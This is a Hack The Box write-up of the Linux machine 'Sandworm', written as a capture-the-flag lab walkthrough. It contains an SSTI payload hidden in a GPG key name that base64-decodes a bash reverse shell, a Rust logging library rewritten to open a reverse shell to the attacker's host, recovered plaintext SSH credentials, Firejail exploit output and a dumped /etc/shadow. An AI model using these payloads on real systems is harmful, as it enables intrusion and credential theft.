---
layout: post
title: HTB{Sandworm}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

SSTI:

```text
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ gpg --gen-key                                           
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
Email address: asd@asd.asd
You selected this USER-ID:
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }} <asd@asd.asd>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/01812C33E74668449E66FE1EFCB9D9D9F6AF9B9B.rev'
public and secret key created and signed.

pub   rsa3072 2023-10-23 [SC] [expires: 2025-10-22]
      01812C33E74668449E66FE1EFCB9D9D9F6AF9B9B
uid                      {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }} <asd@asd.asd>
sub   rsa3072 2023-10-23 [E] [expires: 2025-10-22]

                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ gpg --armor --export asd@asd.asd > public_key.asc
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ ls    
message.txt  pass  public_key.asc  signed_message.asc
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ rm -rf message.txt       
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ rm -rf signed_message.asc 
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ echo "aa dfsdf" | gpg --clear-sign -u asd@asd.asd
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

aa dfsdf
-----BEGIN PGP SIGNATURE-----

iQHABAEBCgAqFiEEAYEsM+dGaESeZv4e/LnZ2favm5sFAmU2TyAMHGFzZEBhc2Qu
YXNkAAoJEPy52dn2r5ub3HcMAJ7a60q8xlGE8P8sAfTfcsbgpJitCn4+Bw1JDlNq
u++A2zm75BNqbNpcQZMs9zoNAOMRb6YATieKcePXuc7kkHYd7ZiCYZFMOh/NCR4f
/j3FC07ZddSE4ofoXu56seaGyENnCvZ+9Yd16tf6w1/I3XyX2fsW63twOBwag1Y/
GIPZkP84KHG2tHrW3jsT9brbJ0Ixhyj8dnqGqI2e11MJa/RGgkCJ9U0rNGi0yv4X
F32cN65I5SqR8X5J9zKsA6uEPEUUCr1kJT/03jOEEQl1IdvBJaVQ4+LQUsnGLBCF
l0MBLV7pSChTJ2I+etONfewo/eH0G1iy1thbWHQfWCRg8F+W90fp2K9jDHneXtlE
AzcGarLTGRB4ph3mG+2gFR8LiXCnLU2J6sL1w0rgTMx0lULoaJaDnT9Mr0UqBPjg
rkAMjCNbrLQ/c3LJn387Gx3YUBVlMNea5JAibqNZy3ktxCe4AytqOqOy95BqUHpr
evExebmh0ru4AhFBA5LtGJZw8g==
=ZJ0/
-----END PGP SIGNATURE-----
                                                                                                                     
```


Get ssh creds for user 'silentobserver' and password `silentobserver`:

```text
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admi	
cat admin.json 
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}

```
Login with ssh:


```text
┌──(kali㉿kali)-[~/htb/machines/Sandworm]
└─$ ssh silentobserver@10.10.11.218  

Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31
silentobserver@sandworm:~$ cat user.txt 
5ad95cb6dd4e7ba4855d8dccf94152f2

```

### ROOT:


lib.rs

```text
// I couldn't find the owner of the exploit, anyone who knows can comment so I can give the credits ;)
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.14.98/444 0>&1";
    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("not work");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        println!("standar output: {}", stdout);
        println!("error output: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: {}", stderr);
    }

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification", timestamp, user, query);

    let mut file = match OpenOptions::new().append(true).create(true).open("log.txt") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
    
```

Firejail exploit:

```text
atlas@sandworm:~$ python3 exploit.py 
You can now run 'firejail --join=42632' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.


```




```text
atlas@sandworm:~$ firejail --join=42632
changing root to /proc/42632/root
Warning: cleaning all supplementary groups
Child process initialized in 6.58 ms
atlas@sandworm:~$ su -
root@sandworm:~# cat /root/
.bash_history  .config/       .local/        .ssh/          domain.crt     domain.key     
.bashrc        .gnupg/        .profile       Cleanup/       domain.csr     root.txt       
root@sandworm:~# cat /root/root.txt 
051e595ea2583cdb4c811bc2f326872e
root@sandworm:~# cat /etc/shadow
root:$y$j9T$Pg7Bm6pt5ZGjXKjHtVx1A0$oUzCb1AdkT8LSqDw/S8epzo8NulMfPH1siYjXUbZl0B:19395:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18822:0:99999:7:::
fwupd-refresh:*:19320:0:99999:7:::
mysql:!:19390:0:99999:7:::
silentobserver:$y$j9T$bCOHQ6BXJpACSRhEUptt50$2gOEbQ08M76nlLu6F5RJX61ufBUDSW67zVfwRdHcsI4:19394:0:99999:7:::
atlas:$y$j9T$G9Wo78J1wNdBpflU3JDbb1$A087OjgjVVM7G/DrtMLWev77DZfpOQU2iidRClpCJbD:19395:0:99999:7:::
_laurel:!:19514::::::
root@sandworm:~# 


```


